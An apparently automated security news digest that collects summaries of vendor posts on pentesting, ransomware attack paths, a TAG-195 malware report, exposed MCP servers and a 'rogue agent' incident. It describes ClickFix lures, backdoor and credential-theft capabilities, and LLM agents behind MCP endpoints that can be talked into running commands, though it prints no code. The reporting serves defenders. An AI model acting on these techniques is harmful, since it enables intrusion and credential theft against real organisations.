- Source: Horizon3 Attack Research (offensive_vulnerability_research)
- Published: 2026-07-28T16:03:10+00:00
- Link: https://horizon3.ai/downloads/factsheets/nodezero-webapp-factsheet/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
Learn how NodeZero WebApp continuously tests custom web applications the way attackers do—crawling, authenticating, exploiting, and proving business impact through autonomous pentesting.
```

#### Full body

```
Different Attack Surface. Same Outcome: Security You Can Prove. Horizon3.ai July 28, 2026 Factsheets Modern attackers don’t stop at infrastructure—they target the custom web applications your business depends on every day. NodeZero® WebApp continuously validates which web application weaknesses attackers can actually exploit into business impact by crawling, authenticating, attacking, and proving consequences the way real attackers operate. Instead of generating another list of theoretical findings, NodeZero WebApp provides evidence of what is truly exploitable so your team knows exactly what to fix first. Continuously Test the Web Applications Attackers Actually Target Traditional scanners and manual penetration tests provide valuable insight, but they can’t continuously validate how attackers move through modern web applications with authenticated workflows, business logic, and interconnected attack paths. NodeZero WebApp fills that gap by autonomously testing web applications the way attackers do. NodeZero WebApp helps organizations: Continuously crawl and discover modern web applications, APIs, and hidden routes Test authenticated, role-based workflows with credential and MFA support Validate business logic flaws, broken access control, IDOR, and BOLA vulnerabilities Safely test production, staging, and development environments with graduated testing modes Connect web application weaknesses to identity, cloud, and infrastructure attack paths Deliver replayable proof, screenshots, and request/response evidence developers can immediately verify Measure exploitable business risk instead of relying on vulnerability counts alone Security Teams Get More Than Findings—They Get Proof Every autonomous pentest produces clear evidence showing exactly how NodeZero navigated the application, what it discovered, and how weaknesses can be exploited. Reports connect application-layer vulnerabilities to broader attack paths and business impact, giving security teams actionable remediation guidance while providing audit-ready evidence for leadership and stakeholders. Core NodeZero WebApp Capabilities NodeZero WebApp combines modern web application testing with the broader NodeZero Proactive Security Platform through capabilities including: Production-safe graduated testing that expands safely as confidence grows Authenticated and role-aware testing for real user workflows Discovery of SPAs, REST, SOAP, and GraphQL APIs using headless browser crawling Unified attack path validation across web applications, identity, cloud, and infrastructure Business logic and access control testing for exploitable authorization weaknesses Replayable proof with screenshots, request/response details, and route context for rapid remediation See How NodeZero WebApp Validates Real-World Web Application Risk Download the NodeZero WebApp Factsheet to learn how Horizon3.ai helps organizations continuously validate exploitable web application risk through production-safe autonomous pentesting, authenticated testing, business logic validation, and replayable proof. Download as PDF How can NodeZero help you? Let our experts walk you through a demonstration of NodeZero ® , so you can see how to put it to work for your organization. Get a Demo Share:
```

#### Corroborating sources (1)

- **Horizon3 Attack Research** (offensive_vulnerability_research)
  - Title: Different Attack Surface. Same Outcome: Security You Can Prove.
  - Published: 2026-07-28T16:03:10+00:00
  - Link: https://horizon3.ai/downloads/factsheets/nodezero-webapp-factsheet/
  - Summary: Learn how NodeZero WebApp continuously tests custom web applications the way attackers do—crawling, authenticating, exploiting, and proving business impact through autonomous pentesting.

### Cluster 6112bc74de — score 10

- Title: The New Measure of Infrastructure Readiness
- Source: Horizon3 Attack Research (offensive_vulnerability_research)
- Published: 2026-07-27T14:15:00+00:00
- Link: https://horizon3.ai/intelligence/blogs/infrastructure-readiness/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
Discover how World Wide Technology and Horizon3.ai help enterprises validate infrastructure readiness through continuous attack path validation and evidence-based cyber resilience.
```

#### Full body

```
The New Measure of Infrastructure Readiness Tim Finnell July 27, 2026 Blogs How World Wide Technology and Horizon3.ai help enterprises validate resilience against AI-accelerated threats. Enterprise infrastructure has always been built around a simple objective: keep the business running. Organizations have invested billions of dollars in networking, cloud platforms, identity systems, endpoint security, detection technologies, and resilience programs. Security teams continuously patch vulnerabilities, deploy new controls, validate configurations, and measure compliance against established frameworks. Those investments remain essential. They were also largely designed for a world where attackers operated at human speed. Artificial intelligence has changed that assumption. Today’s attackers can use AI to accelerate reconnaissance, develop exploits, analyze vast attack surfaces, identify exploitable weaknesses, and chain together complex attack paths in a fraction of the time previously required. Activities that once required skilled operators working methodically over days or weeks can increasingly be executed in minutes and repeated at virtually unlimited scale. As AI compresses the time between exposure and exploitation, organizations can no longer afford to assume their defenses work. Even so, Horizon3.ai’s 2026 State of Assumed Security report found that only 30% of CISOs say their organizations routinely validate that risk has actually been remediated after patching, while nearly half simply rescan for vulnerabilities. Infrastructure readiness is no longer defined by what has been deployed. It is defined by what continues to perform when an AI-enabled attacker is actively trying to break it. Architecture Alone Is No Longer Enough Modern enterprises rarely lack security technology. Most have invested heavily in identity platforms, cloud security, network segmentation, endpoint protection, vulnerability management, SIEM, Zero Trust initiatives, and countless point solutions designed to reduce risk. Viewed individually, many of these technologies perform exceptionally well. Attackers, however, do not attack individual technologies. They exploit the spaces between them. A compromised identity becomes privileged access. A cloud misconfiguration becomes lateral movement. A trusted connection bypasses segmentation. Weaknesses that appear insignificant in isolation become significant when chained together into an attack path, and artificial intelligence accelerates every step of that process. That is why infrastructure can no longer be evaluated as a collection of independent technologies. It must be evaluated as an interconnected system operating under adversarial pressure. The question is no longer whether individual controls work. It is whether the architecture works. Defending at the Speed of AI Recognizing this shift, World Wide Technology recently launched its Defending at the Speed of AI initiative, bringing together leading technology partners to help organizations prepare for a new operating reality. The initiative reflects a broader shift in how organizations build and measure cyber resilience. Organizations are moving beyond periodic assessments toward continuous validation because confidence alone is no longer enough. As AI accelerates both attack speed and complexity, security leaders need evidence that their infrastructure, security controls, and operational defenses perform as intended under real-world conditions. That objective cannot be achieved by any single technology. It requires an ecosystem that combines validated offensive testing, resilient infrastructure, intelligent operations, and implementation expertise into a continuous operating model rather than a collection of isolated products. The natural question then becomes: How do you measure infrastructure readiness in the age of AI? From Confidence to Proof The first outcome of the WWT and Horizon3.ai partnership is the Mythos Infrastructure Readiness Assessm
```

#### Corroborating sources (1)

- **Horizon3 Attack Research** (offensive_vulnerability_research)
  - Title: The New Measure of Infrastructure Readiness
  - Published: 2026-07-27T14:15:00+00:00
  - Link: https://horizon3.ai/intelligence/blogs/infrastructure-readiness/
  - Summary: Discover how World Wide Technology and Horizon3.ai help enterprises validate infrastructure readiness through continuous attack path validation and evidence-based cyber resilience.

### Cluster b4009da441 — score 10

- Title: Ransomware is the Scoreboard
- Source: Recorded Future (threat_research_primary)
- Published: 2026-07-24T00:00:00+00:00
- Link: https://www.recordedfuture.com/blog/ransomware-is-the-scoreboard
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, phishing_social_eng, ransomware_extortion
- affected_industries: government, legal_professional
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: ransomware_extortion, phishing_social_eng, apt_espionage
- affected_industries: government, legal_professional
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Ransomware is the scoreboard for defensive architecture. Learn why traditional security methods fail and how to use AI and threat intelligence to identify and remediate critical attack paths.
```

#### Full body

```
Ransomware is the Scoreboard Every Victim is a Verdict on Defensive Architecture 13,000. That’s the number of ransomware victims Recorded Future has observed over the past two years. Watching the near-real-time ransomware attacks on businesses, non-profits, and government agencies has left me, like many security professionals and board directors, pondering how and why cyber defense keeps losing this particular fight. Adversaries like Interlock and RansomHub have continued their successful march to riches over the past 18 months. The multi-billion-ruble question is, “How?” BloodHound and the defensive graph concept debuted over a decade ago and still maintain a vibrant open-source community. Continuous Threat Exposure Management (CTEM) (and attack path management) is an established cyber vendor category, yet ransomware crews are demonstrably eating many organizations’ lunch. Let’s explore the problems (which are relatively easy to enumerate) and a solution (harder): modeling defense as the graph attackers actually traverse, at the speed they traverse it, which, of course, involves intelligence. The Barometer Ransomware is a solid barometer of operational defensive success, specifically because, unlike espionage, it’s noisy, financially motivated, and opportunistic. Certainly, ransomware also benefits from an optimal ecosystem, including payment economics, cyber insurance playbooks, and jurisdictional safe havens, which help incentivize ransomware gangs to find the cheapest attack paths. Relatively inexperienced actors can pick up commodity tools and reach the crown jewels. That highly repeated Ransomware-as-a-Service (RaaS) dynamic is a verdict on the availability of attack paths, regardless of payment incentives. tkhlbp1eyn The prior two years of Recorded Future data revealed 834 unique ransomware families (or brands). The ransomware playbook is only becoming more effective over time, particularly as regional and industry-specific data privacy compliance regulations proliferate. The risk impact is now less about operational disruption, as offline backup resilience has increased, and more squarely focused on the legal or compliance failure of losing legislatively protected information. What’s in a Graph? It’s helpful to visualize an organization as an interconnected graph of nodes and edges, comprising hosts, configurations, credentials, and more. Adversaries attempt to traverse the graph and identify any available weaknesses that, when combined (via attack paths), lead to risk impacts. If operational defense shifts focus from compliance-driven lists and categories, and we model the environment as a graph, will we better understand and remediate attack paths to prevent ransomware? Only if we can match adversarial velocity. hiccbodazp For an enterprise, the graph is combinatorially large, changes hourly, and humans can’t maintain or query it at the tempo at which attackers traverse it. Graphs provide the structure. Threat intelligence supplies the edge weights, and AI agents deliver the speed. In practice, that means agents recompute attack paths whenever the graph changes, test whether a newly reported adversary technique actually traverses your environment, and push the choke point to the top of the remediation queue, continuously, without waiting on an analyst. Interlock ransomware is a good example of an attack path. Interlock uses multiple tactics to acquire unauthorized access. One of their favorites is ClickFix-style social engineering : a fake CAPTCHA convinces a user to paste a command into the Windows Run dialog or PowerShell, which executes malware that harvests credentials, and the group moves laterally from there. That initial access is CVE-free at the point of entry, and it doesn’t appear on any vulnerability list. The entire path is identity and configuration edges. A defender with a perfect, fully patched vuln list has zero visibility into the path Interlock actually takes. That’s one example of an attack path. I
```

#### Corroborating sources (1)

- **Recorded Future** (threat_research_primary)
  - Title: Ransomware is the Scoreboard
  - Published: 2026-07-24T00:00:00+00:00
  - Link: https://www.recordedfuture.com/blog/ransomware-is-the-scoreboard
  - Summary: Ransomware is the scoreboard for defensive architecture. Learn why traditional security methods fail and how to use AI and threat intelligence to identify and remediate critical attack paths.

### Cluster 9df0a945fb — score 10

- Title: TAG-195 Upgrades MaaS Ecosystem with Modular Tools
- Source: Recorded Future (threat_research_primary)
- Published: 2026-07-23T00:00:00+00:00
- Link: https://www.recordedfuture.com/research/tag-195-evolves-maas-ecosystem
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: credential_theft, web_shell_backdoor
- affected_industries: critical_infrastructure
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: credential_theft, web_shell_backdoor
- affected_industries: critical_infrastructure
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Insikt Group identifies four new TAG-195 malware families, revealing an architectural transition toward modular, operator-driven tooling in the MaaS ecosystem
```

#### Full body

```
TAG-195 Upgrades MaaS Ecosystem with Modular Tools Executive Summary Insikt Group identified four new TAG-195 ("Golden Chickens", “Venom Spider”) malware families through ongoing tracking of the TAG-195 MaaS ecosystem. We named two of the families "TinyEgg" and “ChonkyChicken"; the third is a modularized variant of ChonkyChicken. The fourth family, which includes a modified browser credential theft helper, we named “ChromEggscalator". TAG-195 is a financially motivated malware-as-a-service (MaaS) developer whose tooling Insikt Group has previously linked to TAG-127 as an operator and customer. (Insikt Group has directly observed TAG-127 deploying TinyEgg via “ClickFix”-style campaigns that use fake security verification pages to trick victims into manually executing malicious commands that download and install malware payloads via a legitimate Windows system utility.) The four new families indicate an architectural transition and evolution in the TAG-195 MaaS ecosystem. TinyEgg is a lightweight initial-access backdoor providing host profiling, interactive shell access, and persistence management. ChonkyChicken substantially expands that capability with browser credential theft, browser session automation, credential-backed remote execution, network reconnaissance, and sustained surveillance. The modularized ChonkyChicken extends this design by introducing a controller-and-plugin architecture in which a base controller implant requests and loads discrete capability modules from attacker-controlled infrastructure on demand rather than embedding all functionality in the implant itself. TAG-195 also modified a publicly available Chrome encryption-bypass tool into a custom helper within the malware family that Insikt Group named ChromEggscalator. All four families share a common set of architectural traits: consistent command-and-control mechanisms, a shared persistence approach, string obfuscation, and execution via the same delivery model. Insikt Group assesses that TAG-195’s transition to a modular architecture almost certainly reduces the base implant's static detection exposure, and likely also reflects commercial incentives inherent to the MaaS model, including the ability to provision capabilities selectively to operators, limit exposure if a customer is compromised, and serve a broader range of operational requirements. Defenders should prioritize detection of ClickFix-style clipboard execution chains, misuse of legitimate system utilities to load payloads from user-writable directories, suspicious startup persistence mechanisms, browser processes launched with remote debugging enabled, and unusual outbound communications to attacker-controlled infrastructure. Key Findings Insikt Group identified four new TAG-195 malware families through its continued tracking of the TAG-195 MaaS ecosystem: TinyEgg, ChonkyChicken, a modularized variant of ChonkyChicken, and ChromEggscalator. Their identification indicates sustained active development and a deliberate architectural transition toward modular, operator-driven tooling. The modularized ChonkyChicken variant uses a controller-and-plugin architecture in which a base controller implant requests and loads at least fourteen capability modules on demand. Insikt Group assesses that this design almost certainly reduces the base implant's static detection footprint while enabling operators to deploy only what each intrusion requires. All four malware families share four recurring architectural traits that indicate their origin within the same TAG-195 development ecosystem: filename execution gating, Run key persistence under a consistent value name, string obfuscation, and execution via a legitimate Windows binary. Background TAG-195, also known as “Golden Chickens” or "Venom Spider", is a financially motivated MaaS developer with a long-standing history of providing credential theft and remote access tooling to criminal operators. Insikt Group assesses TAG-195 as a MaaS provider based o
```

#### Corroborating sources (1)

- **Recorded Future** (threat_research_primary)
  - Title: TAG-195 Upgrades MaaS Ecosystem with Modular Tools
  - Published: 2026-07-23T00:00:00+00:00
  - Link: https://www.recordedfuture.com/research/tag-195-evolves-maas-ecosystem
  - Summary: Insikt Group identifies four new TAG-195 malware families, revealing an architectural transition toward modular, operator-driven tooling in the MaaS ecosystem

### Cluster 8d776f4b56 — score 10

- Title: The Next Evolution of MDR: Preemptive Defense and Agentic Investigation
- Source: Rapid7 (offensive_vulnerability_research)
- Published: 2026-07-28T13:00:00+00:00
- Link: https://www.rapid7.com/blog/post/dr-the-next-evolution-mdr-preemptive-defense-agentic-investigation
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- threat_categories: data_breach
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
For years, security operations followed a familiar sequence: detect suspicious activity, investigate what happened, and respond before it caused significant harm. That model developed in a threat landscape where defenders had considerably more time to establish the facts and decide what to do next. In 2019, the average data breach took 206 days to identify and another 73 days to contain, creating a total breach lifecycle of 279 days . As the time between initial access and attacker movement continues to contract, security teams are being asked to operate within a much narrower window. AI is accelerating reconnaissance, vulnerability discovery, and campaign execution, while defenders are responsible for growing volumes of data across cloud, identity, endpoint, SaaS, and AI environments, often without equivalent growth in analyst capacity. Managed detection and response is evolving to meet those conditions by connecting exposure intelligence, machine-speed investigation, and human expert
```

#### Full body

```
Back to Blog Detection and Response The Next Evolution of MDR: Preemptive Defense and Agentic Investigation Mikayla Wyman Jul 28, 2026 | Last updated on Jul 28, 2026 | 5 min read DISCOVER RAPID7 MDR For years, security operations followed a familiar sequence: detect suspicious activity, investigate what happened, and respond before it caused significant harm. That model developed in a threat landscape where defenders had considerably more time to establish the facts and decide what to do next. In 2019, the average data breach took 206 days to identify and another 73 days to contain, creating a total breach lifecycle of 279 days . As the time between initial access and attacker movement continues to contract, security teams are being asked to operate within a much narrower window. AI is accelerating reconnaissance, vulnerability discovery, and campaign execution, while defenders are responsible for growing volumes of data across cloud, identity, endpoint, SaaS, and AI environments, often without equivalent growth in analyst capacity. Managed detection and response is evolving to meet those conditions by connecting exposure intelligence, machine-speed investigation, and human expertise. This approach helps security teams identify credible risks sooner, understand their potential impact, and intervene earlier in the attack lifecycle. MDR must move beyond alert-driven investigations When suspicious activity generates an alert, traditional MDR typically moves into investigation mode. Analysts gather information about the affected asset or identity, correlate activity across security tools, establish the scope of the incident, and determine the appropriate response. Although each step is necessary, much of the initial work involves finding and organizing information rather than applying expert judgment. Analysts can spend valuable time collecting asset details, checking vulnerabilities, validating signals, and reconstructing context before the investigation can progress. Recent research conducted with Omdia found that 93% of security leaders agree AI improves analyst efficiency by automating repetitive tasks. Giving machines responsibility for routine evidence gathering and correlation allows analysts to focus their time on complex investigations, business impact, and response decisions. Preemptive MDR connects exposure and detection Exposure management and security operations often provide different views of the same environment. Exposure teams understand which vulnerabilities, assets, identities, and attack paths present risk, while detection and response teams see activity as it unfolds. Connecting these views gives analysts more context at the beginning of an investigation. Preemptive MDR brings asset criticality, internet exposure, vulnerability data, and threat intelligence directly into the SOC workflow. When an alert appears, analysts can immediately see why the affected asset matters, which weaknesses may be involved, and whether the activity aligns with known attacker behavior. The same context can also support action before an alert fires. Intelligence indicating stolen credentials or compromised sessions can be surfaced before an attacker uses them, while newly disclosed vulnerabilities can be assessed against the organization’s assets and business priorities. MDR teams can then guide remediation towards the exposures most likely to create a viable route into the environment. By moving exposure intelligence closer to detection and response, investigations begin with a clearer understanding of what is happening and where action will have the greatest effect. Agentic SOC capabilities accelerate investigation By bringing security data together across the environment, connected context creates the foundation for agentic SOC capabilities. Security investigations require evidence gathering, correlation, validation, and scoping, with many of these tasks repeated across every alert. AI agents can perform elements of that work in
```

#### Corroborating sources (1)

- **Rapid7** (offensive_vulnerability_research)
  - Title: The Next Evolution of MDR: Preemptive Defense and Agentic Investigation
  - Published: 2026-07-28T13:00:00+00:00
  - Link: https://www.rapid7.com/blog/post/dr-the-next-evolution-mdr-preemptive-defense-agentic-investigation
  - Summary: For years, security operations followed a familiar sequence: detect suspicious activity, investigate what happened, and respond before it caused significant harm. That model developed in a threat landscape where defenders had considerably more time to establish the facts and decide what to do next. In 2019, the average data breach took 206 days to identify and another 73 days to contain, creating a total breach lifecycle of 279 days . As the time between initial access and attacker movement continues to contract, security teams are being asked to operate within a much narrower window. AI is accelerating reconnaissance, vulnerability discovery, and campaign execution, while defenders are responsible for growing volumes of data across cloud, identity, endpoint, SaaS, and AI environments, often without equivalent growth in analyst capacity. Managed detection and response is evolving to meet those conditions by connecting exposure intelligence, machine-speed investigation, and human expert

### Cluster 81506af28c — score 10

- Title: Rapid7 and Exclusive Networks expand partnership to modernize security operations and accelerate customer success
- Source: Rapid7 (offensive_vulnerability_research)
- Published: 2026-07-28T08:00:00+00:00
- Link: https://www.rapid7.com/blog/post/c-exclusive-networks-partnership-accelerating-customer-success
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
Claudia Zoon is Senior Manager, Channel Sales at Rapid7. Across Belgium, the Netherlands, and Luxembourg, organizations are accelerating digital transformation through AI, cloud adoption, and increasingly connected business operations. These investments are creating new opportunities for innovation, but also reshaping the cybersecurity landscape. In this dynamic environment, Rapid7 is excited to announce an expanded strategic distribution partnership with Exclusive Networks across the Benelux region. Why now? Because as organizations grow, so too do the expectations of security teams. As attack surfaces expand, more sophisticated AI-enabled threats emerge; as compliance requirements evolve, leaders expect security to scale right along with the business – all without adding unnecessary complexity. In this chaotic environment, cybersecurity customers are demanding experiences that create more calm. This means no more disconnected security tools or reactive approaches, but integrated secu
```

#### Full body

```
Back to Blog Culture Rapid7 and Exclusive Networks expand partnership to modernize security operations and accelerate customer success Claudia Zoon Jul 28, 2026 | Last updated on Jul 28, 2026 | 3 min read RAPID7'S PARTNER PROGRAM Claudia Zoon is Senior Manager, Channel Sales at Rapid7. Across Belgium, the Netherlands, and Luxembourg, organizations are accelerating digital transformation through AI, cloud adoption, and increasingly connected business operations. These investments are creating new opportunities for innovation, but also reshaping the cybersecurity landscape. In this dynamic environment, Rapid7 is excited to announce an expanded strategic distribution partnership with Exclusive Networks across the Benelux region. Why now? Because as organizations grow, so too do the expectations of security teams. As attack surfaces expand, more sophisticated AI-enabled threats emerge; as compliance requirements evolve, leaders expect security to scale right along with the business – all without adding unnecessary complexity. In this chaotic environment, cybersecurity customers are demanding experiences that create more calm. This means no more disconnected security tools or reactive approaches, but integrated security operations, trusted expertise, and partners who can help them improve visibility and build long-term cyber resilience. Supporting a rapidly evolving market The Benelux region has long been at the forefront of digital innovation. As organizations continue modernizing their infrastructure, they're also preparing for increasingly rigorous cybersecurity requirements through regulations such as NIS2 and DORA. Along these lines, operational resilience has become a board-level priority, making it more important than ever for security teams to simplify operations while maintaining visibility across their environments. Meeting these expectations requires more than technology; it requires partners who understand the regional market, can provide specialist expertise, and help customers navigate an increasingly complex cybersecurity landscape. Why specialist partnerships matter Channel partners play a critical role in acting as trusted advisors who help organizations modernize security operations through technology evaluation, solution implementation, and long-term security strategy build-out. Our expanded partnership with Exclusive Networks reflects Rapid7's continued investment in supporting that partner ecosystem. Exclusive Networks has established itself as one of the region's leading specialist cybersecurity distributors, combining deep technical expertise with a partner-first approach that prioritizes enablement, collaboration, and long-term growth. Together, we're making it easier for partners to access the technical resources, training, and support needed to deliver stronger outcomes for their customers. Helping partners grow Rapid7's AI-powered cybersecurity operations platform helps organizations simplify security operations by unifying exposure management, threat detection and response, managed services, and security automation into one platform. Combined with Exclusive Networks' cybersecurity expertise, technical enablement, and regional support, partners are better positioned to expand managed security services , strengthen customer relationships, and deliver integrated cybersecurity solutions that reduce complexity and improve cyber resilience. Looking ahead Cybersecurity success increasingly depends on strong partnerships that combine innovative technology with local expertise and long-term collaboration. Rapid7 and Exclusive Networks share a commitment to helping partners grow and enabling organizations across Belgium, the Netherlands, and Luxembourg to modernize security operations with confidence. We're excited about the opportunities ahead and look forward to working together to help partners build stronger cybersecurity practices and deliver measurable and positive outcomes for customers across the Benelux r
```

#### Corroborating sources (1)

- **Rapid7** (offensive_vulnerability_research)
  - Title: Rapid7 and Exclusive Networks expand partnership to modernize security operations and accelerate customer success
  - Published: 2026-07-28T08:00:00+00:00
  - Link: https://www.rapid7.com/blog/post/c-exclusive-networks-partnership-accelerating-customer-success
  - Summary: Claudia Zoon is Senior Manager, Channel Sales at Rapid7. Across Belgium, the Netherlands, and Luxembourg, organizations are accelerating digital transformation through AI, cloud adoption, and increasingly connected business operations. These investments are creating new opportunities for innovation, but also reshaping the cybersecurity landscape. In this dynamic environment, Rapid7 is excited to announce an expanded strategic distribution partnership with Exclusive Networks across the Benelux region. Why now? Because as organizations grow, so too do the expectations of security teams. As attack surfaces expand, more sophisticated AI-enabled threats emerge; as compliance requirements evolve, leaders expect security to scale right along with the business – all without adding unnecessary complexity. In this chaotic environment, cybersecurity customers are demanding experiences that create more calm. This means no more disconnected security tools or reactive approaches, but integrated secu

### Cluster 5b973b1839 — score 10

- Title: The risk hiding behind exposed MCP servers
- Source: Wiz Research (cloud_identity_infrastructure)
- Published: 2026-07-28T15:58:22+00:00
- Link: https://www.wiz.io/blog/the-risk-hiding-behind-exposed-mcp-servers
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
How unauthenticated Model Context Protocol (MCP) servers are opening doors to sensitive cloud data, IAM, and command execution.
```

#### Full body

```
Wiz Pricing Get a demo Get a demo Model Context Protocol has been rapidly gaining popularity ever since its debut, but adoption of its security features hasn't caught up. Wiz Research recently looked at one part of that gap: MCP servers that organizations have left reachable from the Internet, often entirely unauthenticated. We set out to answer two questions: How widespread this is and How bad it can get. In the course of our research we found multiple unauthenticated MCP servers, including ones run by Fortune 500 companies. These expose sensitive data like employee PII and internal business records, write and delete operations on production systems, and in some cases code execution and access to cloud credentials. By the numbers Despite being a relatively new technology, our data shows that MCP can be found across 80% of cloud environments. About 1 in 6 of those environments expose at least one MCP server. Of exposed servers: ~70% return their full tool catalog to an anonymous caller ~42% return real data when a tool is called ~10% expose a sensitive backend A small but confirmed share is vulnerable to SSRF against the cloud metadata endpoint, returning temporary credentials. Nearly all still negotiate the original protocol version (2024-11-05), from before authentication was added to the spec in March 2025 . How MCP works, and why “exposed” understates it The Model Context Protocol provides a way for AI agents to use remote or local software. A server advertises a set of capabilities, a client connects and asks what’s available, the server responds with a list of capabilities and their parameters, and then the client calls whatever it needs. From an attacker’s perspective, because every MCP server speaks the same handshake, one generic client can scan any server in the world. Here is what that looks like. A single unauthenticated curl returns the server name, protocol version, and the tools it exposes - names, descriptions, parameter schemas. Exposed issue-tracker MCP server. No authentication required. Some MCP servers act as privileged proxies. The MCP endpoint requires no authentication, but it connects to the backend using stored credentials - an API token, a database connection string - and returns the result to any caller. A well-built server can list its tools openly but reject unauthenticated or unauthorized calls. In the course of our research we scanned many MCP servers, some of which blocked our anonymous tool calls while others allowed them. Anonymous access isn’t automatically a risk, and many MCP servers allow it by design. Whether it turns into a security risk depends on how the backend is configured, what actions the MCP server can perform, and how the two connect. What makes exposed MCP servers easier to exploit It’s reasonable to ask what separates this from any unauthenticated REST endpoint left open to the Internet, granting access to a sensitive server. First, it describes itself by default. The tools/list call returns a full, machine-readable catalog of everything the server can do, with the parameter schema for each tool. An API can certainly publish the same in the form of a spec, but with MCP this is built into the protocol, so the reconnaissance potential is baked in. Second, as mentioned above, one generic client can communicate with any server. A fleet of custom APIs doesn’t work that way (though AI-enabled scanning certainly brings us closer to that state). Third, some MCP servers wrap a language-model agent that has shell access to the service backend and expose it as just another tool, making every request a prompt the agent acts upon. The same endpoint that returns a cost report can be talked into running malicious commands, because the only thing deciding what's allowed is the model itself, and its guardrails might be lacking. The problem classes Sensitive-data access is the most common class . Servers in this group proxy tools that reach production databases, internal mailboxes, issue track
```

#### Corroborating sources (1)

- **Wiz Research** (cloud_identity_infrastructure)
  - Title: The risk hiding behind exposed MCP servers
  - Published: 2026-07-28T15:58:22+00:00
  - Link: https://www.wiz.io/blog/the-risk-hiding-behind-exposed-mcp-servers
  - Summary: How unauthenticated Model Context Protocol (MCP) servers are opening doors to sensitive cloud data, IAM, and command execution.

### Cluster 532de505b8 — score 10

- Title: Quoting Akshat Bubna
- Source: Simon Willison (ai_security_agentic_risk)
- Published: 2026-07-28T22:05:55+00:00
- Link: https://simonwillison.net/2026/Jul/28/akshat-bubna/#atom-everything
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- affected_products: OpenAI/ChatGPT
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- affected_products: OpenAI/ChatGPT
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
We’re aware a Modal customer published an unauthenticated endpoint that allowed ​anyone on the internet to use ​their ⁠sandboxes for code execution. This was used by the rogue agent. Modal’s ⁠platform ​or isolation were not ​compromised in anyway. — Akshat Bubna , Modal's CTO, talking to Reuters about this incident Tags: ai-security-research , openai , sandboxing , security , openai-hugging-face-incident
```

#### Full body

```
Simon Willison’s Weblog Subscribe Sponsored by: Cursor — Delegate engineering tasks to Cursor Cloud Agents—even while your laptop is closed. Try Cursor & get 50% off your first month 28th July 2026 We’re aware a Modal customer published an unauthenticated endpoint that allowed ​anyone on the internet to use ​their ⁠sandboxes for code execution. This was used by the rogue agent. Modal’s ⁠platform ​or isolation were not ​compromised in anyway. — Akshat Bubna , Modal's CTO, talking to Reuters about this incident Posted 28th July 2026 at 10:05 pm Recent articles OpenAI’s accidental cyberattack against Hugging Face is science fiction that happened - 22nd July 2026 A Fireside Chat with Cat and Thariq from the Claude Code team - 21st July 2026 Kimi K3, and what we can still learn from the pelican benchmark - 16th July 2026 This is a quotation collected by Simon Willison, posted on 28th July 2026 . sandboxing 51 security 619 openai 436 ai-security-research 30 openai-hugging-face-incident 5 Disclosures Colophon © 2002 2003 2004 2005 2006 2007 2008 2009 2010 2011 2012 2013 2014 2015 2016 2017 2018 2019 2020 2021 2022 2023 2024 2025 2026
```

#### Corroborating sources (1)

- **Simon Willison** (ai_security_agentic_risk)
  - Title: Quoting Akshat Bubna
  - Published: 2026-07-28T22:05:55+00:00
  - Link: https://simonwillison.net/2026/Jul/28/akshat-bubna/#atom-everything
  - Summary: We’re aware a Modal customer published an unauthenticated endpoint that allowed ​anyone on the internet to use ​their ⁠sandboxes for code execution. This was used by the rogue agent. Modal’s ⁠platform ​or isolation were not ​compromised in anyway. — Akshat Bubna , Modal's CTO, talking to Reuters about this incident Tags: ai-security-research , openai , sandboxing , security , openai-hugging-face-incident

### Cluster 73e9449bb7 — score 10

- Title: Report As You Go: Maintaining Good Documentation for SOC Analysts
- Source: Black Hills Information Security (detection_response_operations)
- Published: 2026-07-29T14:00:00+00:00
- Link: https://www.blackhillsinfosec.com/report-as-you-go-soc/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- affected_products: Microsoft SharePoint
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- affected_products: Microsoft SharePoint
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
by Dan “Haircutfish” Rearden | haircutfish.com | Guest Author Working in the SOC can be a grind. Whether triaging alerts, escalating to clients, or just trying to understand why users […] The post Report As You Go: Maintaining Good Documentation for SOC Analysts appeared first on Black Hills Information Security, Inc. .
```

#### Full body

```
